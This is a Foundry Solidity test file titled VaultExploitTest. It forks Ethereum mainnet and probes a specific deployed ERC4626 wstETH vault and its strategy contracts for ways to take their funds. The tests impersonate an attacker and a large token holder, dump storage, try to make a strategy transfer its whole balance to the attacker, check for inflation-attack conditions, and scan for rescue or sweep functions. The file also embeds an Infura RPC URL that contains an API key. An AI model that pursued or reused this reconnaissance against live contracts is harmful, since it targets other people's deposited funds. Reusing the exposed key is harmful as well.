// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVault {
    // ERC4626 functions
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function mint(uint256 shares, address receiver) external returns (uint256);

    // View functions
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function asset() external view returns (address);
    function owner() external view returns (address);
    function maxDeposit(address) external view returns (uint256);
    function maxWithdraw(address) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function previewWithdraw(uint256 assets) external view returns (uint256);

    // Custom functions to probe
    function paused() external view returns (bool);
    function depositCap() external view returns (uint256);
    function strategies(uint256) external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IwstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
    function stETH() external view returns (address);
}

contract VaultExploitTest is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    // stETH address not used
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_1 = 0x5aE0e44DE96885702bD99A6914751C952d284938;
    address constant STRATEGY_2 = 0xB27D688Ac06a441c005657971B11521e80CdcE98;
    address constant STRATEGY_3 = 0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultCompletely() public view {
        console.log("=== COMPLETE VAULT ANALYSIS ===\n");

        IVault vault = IVault(VAULT);

        // Basic info
        console.log("Vault address:", VAULT);

        try vault.owner() returns (address owner) {
            console.log("Vault owner:", owner);
        } catch {
            console.log("Vault owner() failed");
        }

        try vault.asset() returns (address asset) {
            console.log("Underlying asset:", asset);
        } catch {
            console.log("Vault asset() failed");
        }

        try vault.totalAssets() returns (uint256 total) {
            console.log("Total assets:", total);
            console.log("Total assets (ETH):", total / 1e18);
        } catch {
            console.log("Vault totalAssets() failed");
        }

        try vault.totalSupply() returns (uint256 supply) {
            console.log("Total shares supply:", supply);
        } catch {
            console.log("Vault totalSupply() failed");
        }

        // Check wstETH balance
        uint256 vaultWstETH = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH balance:", vaultWstETH);
        console.log("Vault wstETH (formatted):", vaultWstETH / 1e18);
    }

    function test_ProbeVaultFunctions() public {
        console.log("=== PROBING VAULT FUNCTIONS ===\n");

        IVault vault = IVault(VAULT);

        // Check max deposit/withdraw
        try vault.maxDeposit(attacker) returns (uint256 max) {
            console.log("Max deposit for attacker:", max);
        } catch {
            console.log("maxDeposit failed");
        }

        try vault.maxWithdraw(attacker) returns (uint256 max) {
            console.log("Max withdraw for attacker:", max);
        } catch {
            console.log("maxWithdraw failed");
        }

        // Try to check if paused
        try vault.paused() returns (bool isPaused) {
            console.log("Vault paused?", isPaused);
        } catch {
            console.log("paused() not available");
        }

        // Try to check deposit cap
        try vault.depositCap() returns (uint256 cap) {
            console.log("Deposit cap:", cap);
        } catch {
            console.log("depositCap() not available");
        }
    }

    function test_TryDirectDeposit() public {
        console.log("=== ATTEMPTING DIRECT DEPOSIT ===\n");

        vm.startPrank(attacker);

        // Get some wstETH first
        // We'd need to wrap stETH or buy wstETH
        // For testing, let's use a whale

        address wstETHWhale = 0x3c22ec75ea5D745c78fc84762F7F1E6D82a2c5BF; // Large holder

        // Check whale balance
        uint256 whaleBalance = IERC20(wstETH).balanceOf(wstETHWhale);
        console.log("Whale wstETH balance:", whaleBalance / 1e18);

        vm.stopPrank();

        // Impersonate whale to test deposit
        if (whaleBalance > 1 ether) {
            vm.startPrank(wstETHWhale);

            // Approve vault
            IERC20(wstETH).approve(VAULT, 1 ether);

            // Try to deposit
            try IVault(VAULT).deposit(1 ether, wstETHWhale) returns (uint256 shares) {
                console.log("Deposit succeeded! Shares received:", shares);
            } catch Error(string memory reason) {
                console.log("Deposit failed:", reason);
            } catch {
                console.log("Deposit failed (unknown reason)");
            }

            vm.stopPrank();
        }
    }

    function test_CheckVaultStorage() public view {
        console.log("=== VAULT STORAGE ANALYSIS ===\n");

        // Read storage slots to understand vault state
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckStrategyAllowances() public view {
        console.log("=== STRATEGY ALLOWANCES TO VAULT ===\n");

        // Check if strategies have approved vault to spend their tokens
        address[4] memory strategies = [STRATEGY_0, STRATEGY_1, STRATEGY_2, STRATEGY_3];

        for (uint i = 0; i < strategies.length; i++) {
            uint256 allowance = IERC20(wstETH).allowance(strategies[i], VAULT);
            console.log("Strategy", i, "allowance to vault:", allowance);
        }
    }

    function test_AttemptWithdrawFromStrategy() public {
        console.log("=== ATTEMPTING TO WITHDRAW FROM STRATEGY ===\n");

        // Strategy 3 has the most funds
        uint256 strategyBalance = IERC20(wstETH).balanceOf(STRATEGY_3);
        console.log("Strategy 3 wstETH balance:", strategyBalance / 1e18);

        // Can we somehow make the strategy transfer to us?
        // The strategy can only be controlled via:
        // 1. StrategyExecutor (requires executor whitelist)
        // 2. Direct call to execute (requires self-call)

        vm.startPrank(attacker);

        // Try calling strategy directly
        (bool success, bytes memory data) = STRATEGY_3.call(
            abi.encodeWithSignature("execute(address,bytes)", wstETH, abi.encodeWithSignature("transfer(address,uint256)", attacker, strategyBalance))
        );
        console.log("Direct execute call success?", success);

        vm.stopPrank();
    }

    function test_AnalyzeVaultWithdrawPath() public {
        console.log("=== ANALYZING VAULT WITHDRAW PATH ===\n");

        // If we could get vault shares, could we withdraw the wstETH?

        IVault vault = IVault(VAULT);

        // Check conversion rates
        try vault.convertToAssets(1 ether) returns (uint256 assets) {
            console.log("1 share = assets:", assets);
        } catch {
            console.log("convertToAssets failed");
        }

        try vault.previewWithdraw(1 ether) returns (uint256 shares) {
            console.log("To withdraw 1 ETH of assets, need shares:", shares);
        } catch {
            console.log("previewWithdraw failed");
        }

        // Check if anyone has shares
        try vault.balanceOf(VAULT) returns (uint256 bal) {
            console.log("Vault's own share balance:", bal);
        } catch {}

        try vault.balanceOf(STRATEGY_3) returns (uint256 bal) {
            console.log("Strategy 3's share balance:", bal);
        } catch {}
    }

    function test_FlashLoanAttackVector() public {
        console.log("=== FLASH LOAN ATTACK VECTOR ===\n");

        // Could we use a flash loan to:
        // 1. Borrow wstETH
        // 2. Deposit to vault
        // 3. Manipulate something
        // 4. Withdraw more than deposited
        // 5. Repay flash loan

        // This requires a vulnerability in the vault's accounting

        console.log("Flash loan attack requires:");
        console.log("1. Vault accounting vulnerability (inflation attack, etc)");
        console.log("2. Price manipulation vulnerability");
        console.log("3. Reentrancy in deposit/withdraw");
    }

    function test_ERC4626InflationAttack() public {
        console.log("=== ERC4626 INFLATION ATTACK CHECK ===\n");

        IVault vault = IVault(VAULT);

        // Classic ERC4626 inflation attack:
        // 1. First depositor deposits 1 wei
        // 2. Attacker donates large amount to vault
        // 3. Next depositor loses funds due to rounding

        // Check if vault has defenses
        uint256 totalSupply = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();

        console.log("Total supply:", totalSupply);
        console.log("Total assets:", totalAssets);

        if (totalSupply > 0 && totalAssets > 0) {
            console.log("Vault already has deposits - inflation attack harder");
            console.log("Share price:", totalAssets * 1e18 / totalSupply);
        } else if (totalSupply == 0) {
            console.log("WARNING: Vault has no deposits - inflation attack possible!");
        }
    }

    function test_SearchForVulnerablePaths() public view {
        console.log("=== SEARCHING FOR VULNERABLE PATHS ===\n");

        // What are all the ways funds could flow out of strategies/vault?

        console.log("Fund flow analysis:");
        console.log("1. Strategy -> Vault via deposit (controlled)");
        console.log("2. Vault -> User via withdraw (requires shares)");
        console.log("3. Strategy executes actions (requires executor)");
        console.log("4. Direct token transfer (requires owner/approval)");

        // Check if vault has any rescue/emergency functions
        bytes4[] memory emergencyFuncs = new bytes4[](5);
        emergencyFuncs[0] = bytes4(keccak256("emergencyWithdraw()"));
        emergencyFuncs[1] = bytes4(keccak256("rescue(address,uint256)"));
        emergencyFuncs[2] = bytes4(keccak256("sweep(address)"));
        emergencyFuncs[3] = bytes4(keccak256("recoverERC20(address,uint256)"));
        emergencyFuncs[4] = bytes4(keccak256("withdrawStuckTokens(address)"));

        for (uint i = 0; i < emergencyFuncs.length; i++) {
            (bool success,) = VAULT.staticcall(abi.encodeWithSelector(emergencyFuncs[i]));
            if (success) {
                console.log("Found emergency function at selector:");
                console.logBytes4(emergencyFuncs[i]);
            }
        }
    }
}
